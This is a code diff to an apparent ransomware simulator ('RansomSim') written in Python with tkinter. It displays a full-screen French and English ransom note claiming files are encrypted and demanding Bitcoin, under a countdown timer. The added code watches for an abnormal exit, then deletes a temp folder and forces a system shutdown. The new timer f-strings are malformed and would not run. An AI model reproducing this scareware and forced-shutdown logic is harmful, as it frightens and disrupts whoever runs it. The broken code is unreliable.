@@ -24,7 +24,7 @@ def play_error_sound():
         time.sleep(1)
 
 def on_key_event(event):
-    if event.name.lower() == 'r':
+    if event.name.lower() == 'r':  # Restaurer la fermeture avec R
         root.quit()
         return False
     return True
@@ -40,14 +40,14 @@ def load_image(url, size):
 
 def update_text():
     start_time = time.time()
-    end_time = start_time + 60
+    end_time = start_time + 60  # Timer de 1 minute
 
     def update_timer():
         remaining = max(0, int(end_time - time.time()))
         minutes = remaining // 60
         seconds = remaining % 60
         if lang_var.get() == "Français":
-            timer_text = f"Temps restant : {minutes:02d}:{seconds:02d}"
+            timer_text = f"\n\n{TEMPS RESTANT : {minutes:02d}:{seconds:02d}}\n"  # Timer en gros
             full_text = f"""
 Que s'est-il passé sur mon ordinateur ?
 TOUS vos documents, photos, vidéos et bases de données sont DÉSORMAIS CRYPTÉS ! Vos fichiers sont piégés, et chaque seconde qui passe rapproche leur destruction totale. Aucun espoir de récupération sans nous, et nous ne plaisantons pas !
@@ -62,7 +62,7 @@ Le paiement se fait UNIQUEMENT en Bitcoin. Envoyez la somme exigée à l'adresse
 AGISSEZ OU TOUT SERA PERDU !
 """
         else:
-            timer_text = f"Time Left: {minutes:02d}:{seconds:02d}"
+            timer_text = f"\n\n{TIME LEFT: {minutes:02d}:{seconds:02d}}\n"  # Timer en gros
             full_text = f"""
 What Happened to My Computer?
 ALL your documents, photos, videos, and databases are NOW ENCRYPTED! Your files are trapped, and every passing second brings them closer to TOTAL DESTRUCTION. No hope of recovery without us – and we MEAN it!
@@ -77,11 +77,24 @@ Payment is accepted in Bitcoin ONLY. Send the demanded amount to the fake wallet
 ACT NOW OR LOSE EVERYTHING!
 """
         text_canvas.delete("all")
-        text_canvas.create_text(300, 200, text=full_text, font=("Arial", 10), justify="left", anchor="center")
+        text_canvas.create_text(300, 200, text=full_text, font=("Arial", 12, "bold"), justify="left", anchor="center")  # Police plus grande
         if remaining > 0:
             root.after(1000, update_timer)
+        else:
+            root.quit()  # Fermeture automatique à la fin du timer
+
+    # Détection de fermeture anormale (Alt+F4 ou redémarrage)
+    def check_abnormal_exit():
+        if not os.path.exists(os.path.join(os.getenv("TEMP"), "RansomSim", "running.txt")):
+            print("Fermeture anormale détectée (Alt+F4 ou redémarrage). Suppression des fichiers...")
+            import shutil
+            shutil.rmtree(os.path.join(os.getenv("TEMP"), "RansomSim"), ignore_errors=True)
+            os.system("shutdown /s /t 5")
+        else:
+            root.after(1000, check_abnormal_exit)
 
     update_timer()
+    check_abnormal_exit()
 
 root = tk.Tk()
 root.title("Ransomware Team Viewer")
@@ -142,3 +155,5 @@ try:
 finally:
     keyboard.unhook_all()
     winsound.PlaySound(None, winsound.SND_PURGE)
+    if os.path.exists(os.path.join(os.getenv("TEMP"), "RansomSim", "running.txt")):
+        os.remove(os.path.join(os.getenv("TEMP"), "RansomSim", "running.txt"))
